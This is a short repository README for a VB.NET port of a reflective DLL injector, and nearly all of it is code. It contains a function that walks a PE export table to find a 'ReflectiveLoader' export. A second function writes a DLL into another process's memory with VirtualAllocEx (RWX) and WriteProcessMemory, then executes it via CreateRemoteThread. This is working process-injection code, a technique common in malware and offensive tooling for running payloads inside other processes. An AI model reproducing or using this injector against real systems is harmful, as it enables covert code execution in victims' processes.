# ReflectiveInjector

反射式注入器的VB.NET版本    

```vb.net
	Private Function GetReflectiveLoaderOffset(ByVal baseAddress As IntPtr) As UInteger
		Dim dos_header As IMAGE_DOS_HEADER = Marshal.PtrToStructure(baseAddress, GetType(IMAGE_DOS_HEADER))
		Dim nt_header_ptr As IntPtr = IntPtr.Add(baseAddress, dos_header.e_lfanew)
		Dim nt_header As IMAGE_NT_HEADERS32 = Marshal.PtrToStructure(nt_header_ptr, GetType(IMAGE_NT_HEADERS32))
		If nt_header.OptionalHeader.IMAGE_DIRECTORY_ENTRY_EXPORT.VirtualAddress = UInteger.MinValue Then Return Nothing
		Dim lpIED As IntPtr = ImageRvaToVa(nt_header_ptr, baseAddress, nt_header.OptionalHeader.IMAGE_DIRECTORY_ENTRY_EXPORT.VirtualAddress, Nothing)
		Dim IED As IMAGE_EXPORT_DIRECTORY = Marshal.PtrToStructure(lpIED, GetType(IMAGE_EXPORT_DIRECTORY))
		Dim ppExportOfNames As IntPtr = ImageRvaToVa(nt_header_ptr, baseAddress, IED.AddressOfNames, Nothing)
		For i As Integer = 0 To IED.NumberOfNames - 1
			Dim pstrExportOfName As IntPtr = ImageRvaToVa(nt_header_ptr, baseAddress, Marshal.ReadInt32(ppExportOfNames, i * 4), Nothing)
			If Marshal.PtrToStringAnsi(pstrExportOfName).Contains("ReflectiveLoader") Then
				Dim uiAddressArray As IntPtr = ImageRvaToVa(nt_header_ptr, baseAddress, IED.AddressOfFunctions, Nothing)
				Dim uiNameOrdinals As IntPtr = ImageRvaToVa(nt_header_ptr, baseAddress, IED.AddressOfNameOrdinals, Nothing)
				Dim nameOrdinal As UInteger = Marshal.ReadInt16(uiNameOrdinals)
				uiAddressArray += nameOrdinal * 4
				Dim functionRva As UInteger = Marshal.ReadInt32(uiAddressArray)
				For n = 0 To nt_header.FileHeader.NumberOfSections - 1
					Dim imageSectionPtr As IntPtr = IntPtr.Add(IntPtr.Add(baseAddress, dos_header.e_lfanew), Marshal.SizeOf(New IMAGE_NT_HEADERS32()) + n * Marshal.SizeOf(New IMAGE_SECTION_HEADER()))
					Dim pSectionHeader = Marshal.PtrToStructure(imageSectionPtr, GetType(IMAGE_SECTION_HEADER))
					If functionRva >= pSectionHeader.VirtualAddress AndAlso functionRva < (pSectionHeader.VirtualAddress + pSectionHeader.SizeOfRawData) Then
						functionRva = functionRva - pSectionHeader.VirtualAddress + pSectionHeader.PointerToRawData
						Return functionRva
					End If
				Next
			End If
		Next
		Return 0
	End Function
  
  Public Function LoadRemoteLibraryR(hProcess As IntPtr, lpBuffer() As Byte, dwLength As UInteger, lpParameter As IntPtr) As IntPtr
		Dim dwThreadId As UInteger
		Dim hThread As IntPtr = Nothing
		Dim baseAddress As IntPtr = Marshal.AllocHGlobal(lpBuffer.Length)
		Marshal.Copy(lpBuffer, 0, baseAddress, lpBuffer.Length)

		Dim dwReflectiveLoaderOffset As UInteger = GetReflectiveLoaderOffset(baseAddress)
		If dwReflectiveLoaderOffset = 0 Then
			Return IntPtr.Zero
		End If

		Dim lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, IntPtr.Zero, dwLength, MEM_RESERVE Or MEM_COMMIT, PAGE_EXECUTE_READWRITE) 'PAGE_READWRITE
		If lpRemoteLibraryBuffer = IntPtr.Zero Then
			Return IntPtr.Zero
		End If
		If Not WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, Nothing) Then
			Return IntPtr.Zero
		End If
		Dim lpReflectiveLoader As IntPtr = IntPtr.Add(lpRemoteLibraryBuffer, dwReflectiveLoaderOffset)
		hThread = CreateRemoteThread(hProcess, Nothing, 1024 * 1024, lpReflectiveLoader, lpParameter, 0, dwThreadId)
		Marshal.FreeHGlobal(baseAddress)
		Return hThread
	End Function
```
